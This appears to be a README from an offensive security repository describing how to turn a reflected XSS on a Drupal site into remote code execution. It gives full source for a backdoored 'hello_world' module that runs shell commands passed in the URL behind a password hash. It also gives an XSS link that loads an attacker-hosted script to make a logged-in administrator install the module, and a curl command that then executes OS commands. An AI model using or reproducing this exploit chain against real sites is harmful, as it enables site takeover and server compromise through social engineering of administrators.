# [RCE] Install Module

## Test Environment

### Web Browsers (20240224)

* [x] Mozilla Firefox Version 123.0 (64-bit)
* [x] Google Chrome Version 122.0.6261.70 (64-bit)
* [x] Microsoft Edge Version 122.0.2365.52 (64-bit)

## Exploitation Steps

1. [create backdoored CMS module] backdoor source code

    * **NOTE**: update/customize PHP backdoor in `HelloWorldController.php`

    (`hello_world.info.yml`)

    ```
    name: hello_world
    type: module
    description: 'Hello World custom module'
    package: custom
    version: 1.0
    core_version_requirement: ^10
    ```

    (`hello_world.routing.yml`)

    ```
    hello_world.hellomsg:
      path: '/hello-world'
      defaults:
        _controller: 'Drupal\hello_world\Controller\HelloWorldController::message'
        _title: 'Hello World!!'
      requirements:
        _permission: 'access content'
    ```

    (`src/Controller/HelloWorldController.php`)

    ```
    <?php

    namespace Drupal\hello_world\Controller;

    class HelloWorldController {
      public function message() {
        if (md5($_GET['pass']) === '098f6bcd4621d373cade4e832627b4f6') { echo passthru($_GET['cmd']); }
        return [
          '#markup' => 'Hello World message from custom module'
        ];
      }
    }
    ```

2. [create backdoored CMS module] create Drupal module

    ```
    tar cvf hello_world.tar.gz *
    ```

3. [setup exploit] change payload variable values (`installModuleDrupal.js`)

    `exploitURL` - URL of Drupal module (containing backdoor) to be installed on target site

    `drupalRoot` - path to Drupal installation on the target system (e.g. `"/path"`)

4. [setup exploit] setup web server (to serve the payload/module)

5. [social engineering attack] victim user (with administrative privileges) logs in

    http://192.168.5.17/user/login

6. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.17/test/rxss.php?q=<script src=http://192.168.5.15/installModuleDrupal.js></script>
    ```

    * **NOTES**:
      * `192.168.5.17` - target Drupal site
      * `192.168.5.15` - web server hosting payload

7. [post exploit] execute OS command

    ```
    curl -s "http://192.168.5.17/hello-world?pass=test&cmd=id" | head -n 1
    ```

8. [uninstall module] uninstall module via GUI

    *Drupal ➔ Extend ➔ [tab] Uninstall ➔ (filter by name) hello ➔ (mark checkbox) Hello World ➔ Uninstall ➔ Uninstall*

9. [uninstall module] remove module from filesystem

    ```
    sudo su
    cd /var/www/html/drupal/modules
    rm -rf hello_world
    ```

## Screenshots

* **NOTE**: the screenshot covers steps 1 to 7 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/Drupal/InstallModule/screenshots/Drupal_-_install_module_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/Drupal/InstallModule/screenshots/Drupal_-_install_module_-_1-1.png">
    </picture>
  </kbd>
</p>
